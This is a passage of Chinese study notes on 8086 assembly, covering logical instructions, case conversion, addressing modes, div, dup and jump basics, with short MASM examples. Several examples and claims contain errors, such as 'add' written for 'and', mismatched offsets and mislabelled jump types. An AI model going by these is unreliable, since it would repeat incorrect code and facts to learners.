al,01100011B<br>and al,00111011B<br>结果 al=00100011B<br></code></pre></td></tr></table></figure><p>2）or 指令：逻辑或，按位进行或运算（有1就为1）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,01100011B<br>or  al,00111011B<br>结果 al=01111011B<br></code></pre></td></tr></table></figure><h3 id="7-3-以字符形式给出的数据"><a href="#7-3-以字符形式给出的数据" class="headerlink" title="7.3 以字符形式给出的数据"></a>7.3 以字符形式给出的数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code,ds:data<br>data segment<br>db &#x27;unIX&#x27;//相当于“db 75H,6EH,49H,58H”,db定义字节变量，类似dw<br>db &#x27;foRK&#x27;//相当于“db 66H,6FH,52H,4BH”<br>data ends<br>code segment<br>start:mov al,&#x27;a&#x27;//mov al,61H<br>mov bl,&#x27;b&#x27;<br>mov ax,4c00h<br>int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="7-4-大小写转换"><a href="#7-4-大小写转换" class="headerlink" title="7.4 大小写转换"></a>7.4 大小写转换</h3><p>判断某一位置是 0 还是 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db &#x27;BaSiC&#x27;<br>db &#x27;iNfOrMaTiOn&#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br> mov ds,ax//设置ds指向datasg段<br> <br>mov bx,0//设置(bx)=0,ds:bx指向&#x27;BaSiC&#x27;的第一个字母<br><br>mov cx,5//设置循环次数<br>     s:mov al,[bx]//将ASCII码从ds:bx所指向的单元中取出<br>and al,11011111B//将al中的ASCII码的第五位为0，变为大写字母<br>mov [bx],al//转换后的ASCII码写回原单元<br>inc bx//ds:bx指向下一个字母<br>loop s<br><br>mov bx,5//(bx)=5,ds:bx指向&#x27;iNfOrMaTiOn&#x27;的第一个字母<br><br>mov cx,11<br>s0:mov al,[bx]<br>or al,00100000B//将al中的ASCII码第5位置为1，变为小写字母<br>mov [bx],al<br>inc bx<br>loop s0<br><br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="7-5-bx-idata"><a href="#7-5-bx-idata" class="headerlink" title="7.5 [bx+idata]"></a>7.5 [bx+idata]</h3><p>[bx+idata] 表示一个内存单元，偏移地址为 (bx) + idata ( bx中的数值加上 idata )</p><p>mov ax,[bx+200] 的含义:</p><ul><li>将一个内存单元送入ax，内存单元长度为 2 个字节（字单元），存放一个字，偏移地址为 bx 中的数值加上200，段地址在ds中</li><li>(ax)&#x3D;((ds)*16+(bx)+200)</li><li>mov ax,[200+bx]</li></ul><p>​mov ax,200[bx]</p><p>​mov ax,[bx].200</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">2000:1000 BE 00 06 00 00 00 ...<br>写出下面的程序执行后，ax、bx、cx中的内容<br>mov ax,2000H<br>mov ds,ax<br>mov bx,1000H<br><br>mov ax,[bx]//访问的段地址在ds中，(ds)=2000H;偏移地址在bx中,(bx)=1000H;指令执行后(ax)=00BEH<br><br>mov cx,[bx+1]//偏移地址=(bx)+1=1001H;后(cx)=0600H<br><br>add cx,[bx+2]//偏移地址=(bx)+2=1002H;后(cx)=0606H<br></code></pre></td></tr></table></figure><h3 id="7-6-用-bx-idata-的方式进行数组的处理"><a href="#7-6-用-bx-idata-的方式进行数组的处理" class="headerlink" title="7.6  用 [bx+idata] 的方式进行数组的处理"></a>7.6  用 [bx+idata] 的方式进行数组的处理</h3><p>将 datasg 中定义的第一个字符串转化为大写，第二个字符串转化为小写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db &#x27;BaSiC&#x27;<br>db &#x27;MinIX&#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br> mov ds,ax<br> mov bx,0<br> <br> mov cx,5<br> s:mov al.0[bx]<br> and al,11011111b<br> mov 0[bx],al<br> mov al,5[bx]([5+bx])<br> or al,00100000b<br> mov 5[bx]([5+bx]),al<br> inc bx<br> loop s<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="7-7-SI和DI"><a href="#7-7-SI和DI" class="headerlink" title="7.7 SI和DI"></a>7.7 SI和DI</h3><p>si 和 di 是 8086CPU 中和 bx 功能相近的寄存器，不能分成两个 8 位寄存器来使用</p><p>下面三组实现同一功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,0<br>mov ax,[bx]<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov si,0<br>mov ax,[si]<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov di,0<br>mov ax,[di]<br></code></pre></td></tr></table></figure><p>下面三组实现同一功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,0<br>mov ax,[di]<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov si,0<br>mov ax,[si+123]<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov di,0<br>mov ax,[di+123]<br></code></pre></td></tr></table></figure><p>e.g 用 si 和 di 实现将字符串’welcome to masm!’复制到它后面的数据中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db &#x27;welcome to masm!&#x27;<br>db &#x27;................&#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br> mov ds,ax<br> mov si,0<br> mov di,0<br> mov cx,8<br> s:mov ax,[si]<br> mov [di],ax<br> add si,2<br> add di,2<br> loop s<br> mov ax,4c00h<br> int 21h<br>codesg ends<br>end start<br>//ds:si指向要复制的源始字符串，用ds:di指向复制的目的空间。用16位寄存器进行内存单元之间的数据传送，一次复制2个字节，循环8次<br></code></pre></td></tr></table></figure><p>使用 [bx(si或di)+idata] 的方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">codesg segment<br> start:mov ax,datasg<br> mov ds,ax<br> mov si,0<br> <br> mov cx,8<br> s:mov ax,0[si]<br> mov 16[si],ax<br> add si,2<br> loop s<br> <br> mov ax,4c00h<br> int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="7-8-bx-si-和-bx-di"><a href="#7-8-bx-si-和-bx-di" class="headerlink" title="7.8 [bx+si] 和 [bx+di]"></a>7.8 [bx+si] 和 [bx+di]</h3><p>[bx+si] 表示一个内存单元，偏移地址为 (bx)+(si) 即 bx 中的数值加上 si 的数值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bx+si]<br>将一个内存单元的内容送入ax，内存单元的长度为2字节（字单元），存放一个字，偏移地址为bx中的数值加上si中的数值，段地址在ds中<br>(ax)=((ds)*16+(bx)+(si))<br><br>也可写为如下格式<br>mov ax,[bx][si]<br></code></pre></td></tr></table></figure><p>e.g 2000：1000  BE  00  06  00  00  00  ….. ,写出ax、bx、cx中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov ds,ax<br>mov bx,1000H<br>mov si,0<br>mov ax,[bx+si]//段地址在ds中,(ds)=2000H;偏移地址=(bx)+(si)=1000H;指令执行后(ax)=00BEH<br><br>inc si<br>mov cx,[bx+si]//段地址在ds中,(ds)=2000H;偏移地址=(bx)+(si)=1001H;执行指令后(cx)=0600H<br><br>inc si<br>mov di,si<br>add cx,[bx+di]//段地址在ds中,(ds)=2000H;偏移地址=(bx)+(di)=1002H;执行指令后(cx)=0606H<br></code></pre></td></tr></table></figure><h3 id="7-9-bx-si-idata-和-bx-di-idata"><a href="#7-9-bx-si-idata-和-bx-di-idata" class="headerlink" title="7.9  [bx+si+idata] 和 [bx+di+idata]"></a>7.9  [bx+si+idata] 和 [bx+di+idata]</h3><p>[bx+si+idata] 表示一个单元，偏移地址为 (bx)+(si)+idata (即bx中数值加上si中的数值再加上idata)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bx+si+idata]<br>将内存单元送入ax，偏移地址为bx加上si数值再加上idata,段地址在ds中<br>(ax)=((ds)*16+(bx)+(si)+idata)<br><br>也有下面这些格式<br>mov ax,[bx+200+si]<br>mov ax,[200+bx+si]<br>mov ax,200[bx][si]<br>mov ax,[bx].200[si]<br>mov ax,[bx][si].200<br></code></pre></td></tr></table></figure><p>e.g 2000：1000  BE  00  06  00  6A  22  ……写出ax、bx、cx内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov ds,ax<br>mov bx,1000H<br>mov si,0<br>mov ax,[bx+2+si]//段地址在ds中,(ds)=2000H,偏移地址=(bx)+(si)+2=1002H;(ax)=0006H<br><br>inc si<br>mov cx,[bx+2+si]//(ds)=2000H,偏移地址=(bx)+2+(si)=1003H;(cx)=6A00H<br><br>inc si<br>mov di,si<br>mov bx,[bx+2+di]//偏移地址=(bx)+2+(di)=1004H;(bx)=226AH<br></code></pre></td></tr></table></figure><h3 id="7-10-不同的寻址方式的灵活运用"><a href="#7-10-不同的寻址方式的灵活运用" class="headerlink" title="7.10 不同的寻址方式的灵活运用"></a>7.10 不同的寻址方式的灵活运用</h3><ul><li><strong>[idata]</strong> 用<strong>常量</strong>表示地址，可以直接定位一个内存单元</li><li><strong>[bx] <strong>用</strong>变量</strong>来表示内存地址，可以间接定位一个内存单元</li><li><strong>[bx+idata] <strong>用</strong>变量和常量</strong>表示内存地址，可以在起始地址的基础上用变量间接定位一个内存单元</li><li><strong>[bx+si]</strong> 用<strong>两个变量</strong>表示地址</li><li><strong>[bx+si+idata]</strong> 用<strong>两个变量和一个常量</strong>表示地址</li></ul><p>e.g 将datasg段中每个单词的头改为大写字母</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db&#x27;1. file            &#x27;<br>db&#x27;2. edit            &#x27;<br>db&#x27;3. search          &#x27;<br>db&#x27;4. view            &#x27;<br>db&#x27;5. options         &#x27;<br>db&#x27;6. help            &#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br> mov ds,ax<br> mov bx,0<br> mov cx,6<br> s:mov al,[bx+3]<br> and al,11011111b<br> mov [bx+3],al<br> add bx,16<br> loop s<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5f0c30d2f046e045.png"></p><p>e.g 将 datasg 段中每个单词改为大写字母</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db&#x27;ibm             &#x27;<br>db&#x27;dec             &#x27;<br>db&#x27;dos             &#x27;<br>db&#x27;vax             &#x27;<br>datasg ends<br>codesg segment<br>start:mov ax,datasg<br>mov ds,ax<br>mov bx,0//R=第一行地址<br><br>mov cx,4<br><br>s0:mov si,0//C=第一列地址<br>mov cx,3<br><br>s1:mov al,[bx+si]<br>and al,11011111b//改变R行,C列的字母变为大写<br>mov [bx+si],al<br>inc si//下一列地址<br><br>loop s<br><br>add bx,16//下一行地址<br>loop s0<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/e03372fdfe062d0f.png"></p><p>改进程序</p><p><strong>一般情况下，需要暂存数据的时候，应该使用栈</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg,ss:stacksg<br>datasg segment<br>db&#x27;ibm             &#x27;<br>db&#x27;dec             &#x27;<br>db&#x27;dos             &#x27;<br>db&#x27;vax             &#x27;<br>datasg ends<br><br>stacksg segment<br>dw 0,0,0,0,0,0,0,0<br>stacksg ends<br><br>codesg segment<br> start:mov ax,stacksg<br> mov ss,ax<br> mov sp,16<br> mov ax,datasg<br> mov ds,ax<br> mov bx,0<br> mov cx,4<br> <br> s0:push cx//将外层循环的cx值压栈<br> mov si,0<br> mov cx,3//cx设置成内层循环的次数<br> <br> s:mov al,[bx+si]<br> add al,11011111b<br> mov [bx+si],al<br> inc si<br> loop s<br> <br> add bx,16<br> pop cx//从栈顶弹出原cx的值，恢复cx<br> loop s0//外层循环的loop指令将cx中的值-1<br> <br> mov ax,4c00H<br> int 21H<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p>e.g 将 datasg 段每个单词前四个字母改为大写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assumecs:codesg,ss:stacksg,ds:datasg<br>stacksg segment<br>dw 0,0,0,0,0,0,0,0<br>stacksg ends<br>datasg segment<br>db&#x27;1. display      &#x27;<br>db&#x27;2. brows        &#x27;<br>db&#x27;3. replace      &#x27;<br>db&#x27;4. modify       &#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br>mov ds,ax<br>        mov bx,0<br>        <br>        mov cx,4<br>        <br>    s0:mov si,0<br>    mov cx,4<br>    <br>    s:mov al,[bx+si+3]<br>    add al,11011111b<br>    mov [bx+si],al<br>    inc si<br>    loop s<br>    <br>    add bx,16<br>    loop s0<br>    <br>    mov ax,4c00H<br> int 21H<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="八、数据处理的两个基本问题"><a href="#八、数据处理的两个基本问题" class="headerlink" title="八、数据处理的两个基本问题"></a>八、数据处理的两个基本问题</h1><p>reg 寄存器的集合包括：ax、bx、cx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di</p><p>sreg 段寄存器集合包括：ds、ss、cs、es</p><h3 id="8-1-bx、si、di-和-bp"><a href="#8-1-bx、si、di-和-bp" class="headerlink" title="8.1 bx、si、di 和 bp"></a>8.1 bx、si、di 和 bp</h3><p>1）在 8086CPU 中，<strong>只有这四个寄存器可以在“[……]”中进行内存单元的寻址</strong></p><p>2）在[……]中，这4个寄存器可以单个出现，或只能以4种组合出现：&#x3D;&#x3D;<strong>bx+si、bx+di、bp+si、bp+di</strong>&#x3D;&#x3D;</p><p>3）只要在[…]中使用寄存器bp,而指令中没有显性地给出段地址，<strong>段地址就默认在ss中</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bp]//(ax)=((ss)*16+(bp))<br>mov ax,[bp+idata]//(ax)=((ss)*16+(bp)+idata)<br>mov ax,[bp+si]//(ax)=((ss)*16+(bp)+(si))<br>mov ax,[bp+si+idata]//(ax)=((ss)*16+(bp)+(si)+idata)<br></code></pre></td></tr></table></figure><h3 id="8-3-数据位置的表达"><a href="#8-3-数据位置的表达" class="headerlink" title="8.3 数据位置的表达"></a>8.3 数据位置的表达</h3><p>1）立即数 (idata)</p><p>2）寄存器</p><p>3）段地址（SA）和偏移地址（EA）</p><p>存放段地址的寄存器可以是默认的，比如以下指令，段地址默认在 ds 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[0]<br>mov ax,[di]<br>mov ax,[bx+8]<br>mov ax,[bx+si]<br>mov ax,[bx+si+8]<br></code></pre></td></tr></table></figure><p>段地址默认在ss中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bp]<br>mov ax,[bp+8]<br>mov ax,[bp+si]<br>mov ax,[bp+si+8]<br></code></pre></td></tr></table></figure><h3 id="8-4-寻址方式"><a href="#8-4-寻址方式" class="headerlink" title="8.4 寻址方式"></a>8.4 寻址方式</h3><p><img src="https://img.dkdun.cn/v1/2025/12/efb17885fa7dfbc1.png"></p><h3 id="8-5-指令要处理得到数据有多长"><a href="#8-5-指令要处理得到数据有多长" class="headerlink" title="8.5 指令要处理得到数据有多长"></a>8.5 指令要处理得到数据有多长</h3><p>1）通用寄存器指明要处理的数据的尺寸</p><p>2）没有寄存器名存在时，<strong>用操作符 X ptr 指明内存单元的长度，X 可以为 byte 或 word</strong></p><p>3）push 不用指明访问字单元还是字节单元，<strong>push 指令只进行字操作</strong></p><h3 id="8-7-div指令"><a href="#8-7-div指令" class="headerlink" title="8.7 div指令"></a>8.7 div指令</h3><p>1）除数：有 8 位和 16 位，在一个 reg 或内存单元中</p><p>2）被除数：默认放在 AX 或 DX 和 AX 中，除数为 8 位，被除数则为 16 位，默认在 AX 中存放；除数为 16 位，被除数则为 32 位，在 DX 和 AX 中存放，DX 存放高16位，AX 存放低 16 位</p><p>3）结果：除数为 8 位，则 AL 存储除法操作的商，AH 存储除法操作的余数；</p><p>​除数为16位，AX 存储商，DX 存储余数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div reg<br>div 内存单元<br></code></pre></td></tr></table></figure><p>用多种方法表示一个内存单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div byte ptr ds:[0]<br>//(al)=(ax)/((ds)*16+0)的商<br>//(ah)=(ax)/((ds)*16+0)的余数<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div word ptr es:[0]<br>//(ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商<br>//(dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div byte ptr [bx+si+8]<br>//(al)=(ax)/((ds)*16+(si)+8)的商<br>//(ah)=(ax)/((ds)*16+(si)+8)的余数<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div word ptr [bx+si+8]<br>//(ax)=[(dx)*10000H+(ax)]/((ds)+(si)+8)的商<br>//(dx)=[(dx)*10000H+(ax)]/((ds)+(si)+8)的余数<br></code></pre></td></tr></table></figure><p>利用除法指令计算 100001&#x2F;100</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">被除数100001大于65535，不能用ax寄存器存放，用dx和ax两个寄存器联合存放100001.<br>除数小于255，用8位寄存器存放<br><br>mov dx,1<br>mov ax,86A1H<br>mov bx,100<br>div bx<br>//(ax)=03E8H,(dx)=1<br></code></pre></td></tr></table></figure><h3 id="8-8-伪指令-dd"><a href="#8-8-伪指令-dd" class="headerlink" title="8.8 伪指令 dd"></a>8.8 伪指令 dd</h3><p>dd 用来定义 dword(double word,双字)型整数</p><p>用 div 计算 data 段中第一个数据除以第二个数据后的结果，商存在第三个数据存储单元中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">data segment<br>  dd 100001<br>  dw 100<br>  dw 0<br>  <br>  mov ax,data<br>  mov ds,ax<br>  mov ax,ds:[0]//ds:0字单元中的低16位存储在ax中<br>  mov dx,ds:[2]//ds:2中高16位存储到dx中<br>  div word ptr ds:[4]//dx:ax中的32位数据除以ds:4字单元中的数据<br>  mov ds:[6],ax//存储<br>  <br>data ends<br></code></pre></td></tr></table></figure><h3 id="8-9-dup"><a href="#8-9-dup" class="headerlink" title="8.9 dup"></a>8.9 dup</h3><p>操作符，由编译器识别处理，用来进行数据的重复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">db 3 dup (0)<br>//定义3个字节，值为0，相当于db 0,0,0<br><br>db 3 dup (0,1,2)<br>//定义了9个字节，0、1、2、0、1、2、0、1、2，相当于db 0,1,2,0,1,2,0,1,2<br><br>db 3 dup (&#x27;abc&#x27;,&#x27;ABC&#x27;)<br>//18个字节，‘abcABCabcABCabcABC’,相当于db &#x27;abcABCabcABCabcABC&#x27;<br></code></pre></td></tr></table></figure><p>dup 使用格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">db 重复的次数 dup (重复的字节型数据)<br>dw 重复的次数 dup (重复的字型数据)<br>dd 重复的次数 dup (重复的双字型数据)<br></code></pre></td></tr></table></figure><h1 id="九、-转移指令的原理"><a href="#九、-转移指令的原理" class="headerlink" title="九、 转移指令的原理"></a>九、 转移指令的原理</h1><p>可以修改 IP，或同时修改 CS 和 IP 的指令</p><p>8086CPU 转移行为分为两类：</p><ul><li><p><strong>只修改IP，称为段内转移</strong>，比如：jmp 1000:0</p></li><li><p><strong>同时修改CS和IP时，称为段间转移</strong>，比如：jmp 1000:0</p></li></ul><p><strong>段间转移分为：短转移和近转移</strong></p><ul><li>短转移 IP 修改范围为-128~127</li><li>近转移 IP 的修改范围为-32768~32767</li></ul><p>8086CPU 转移指令：</p><ul><li>无条件转移指令（如：jmp）</li><li>条件转移指令</li><li>循环指令（如：loop）</li><li>过程</li><li>中断</li></ul><h3 id="9-1-操作符-offset"><a href="#9-1-操作符-offset" class="headerlink" title="9.1 操作符 offset"></a>9.1 操作符 offset</h3><p>操作符 offset 由编译器处理，取得标号的偏移地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 